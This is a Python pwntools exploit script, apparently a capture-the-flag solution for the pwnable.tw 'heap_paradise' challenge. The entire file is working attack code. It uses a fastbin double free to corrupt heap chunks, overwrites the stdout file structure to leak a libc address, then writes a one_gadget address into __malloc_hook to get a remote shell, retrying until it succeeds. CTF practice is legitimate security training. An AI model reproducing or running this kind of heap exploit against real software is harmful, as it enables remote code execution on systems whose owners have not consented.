from pwn import *

context.log_level = 'debug'
prog = './heap_paradise'
elf = ELF(prog)


libc = ELF("libc_64.so.6")
#
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()

def add(size, content='a'):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("Size :", str(size))
	p.sendafter("Data :", content)
def free(idx):
	p.sendlineafter("Choice:", '2')
	p.sendlineafter("Index :", str(idx))

def exp():
	try:
		global p
		#p = process(prog)
		p = remote('chall.pwnable.tw', 10308)
		add(0x60, (p64(0)+p64(0x71))*7)#0
		add(0x60, (p64(0)+p64(0x21))*7)#1
		free(1)
		free(0)
		free(1)
		add(0x60, '\x20')#2
		add(0x60)#3
		add(0x60)#4
		add(0x60)#5
		free(0)
		add(0x60, 'a'*0x10+p64(0)+p64(0xa1))#6
		free(5)
		free(1)
		free(0)
		add(0x40)#7
		add(0x60, 'a'*0x10+p64(0)+p64(0x71))#8
		free(5)
		add(0x60, 'a'*0x40+p64(0)+p64(0x71)+'\xdd\x55')#9
		add(0x60)#10
		add(0x60, '\x00'*0x33+p64(0xfbad3887)+p64(0)*3+'\x00')#11
		if p.recv(1)!='\x00':
			raise Exception('no leak')
		libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x7ffff7dd2600+0x7ffff7a0d000+0x1000
		log.info("libc.address ==> " + hex(libc.address))
		free(1)
		free(5)
		add(0x60, 'a'*0x40+p64(0)+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))#12
		one = libc.address+0xef6c4
		add(0x60)#13
		add(0x60, '\x00'*19+p64(one))
	
	
		p.interactive()
	except:
		p.close()
		return False
if __name__ == '__main__':
	while not exp():
		pass



#log.info("libc.address ==> " + hex(libc.address))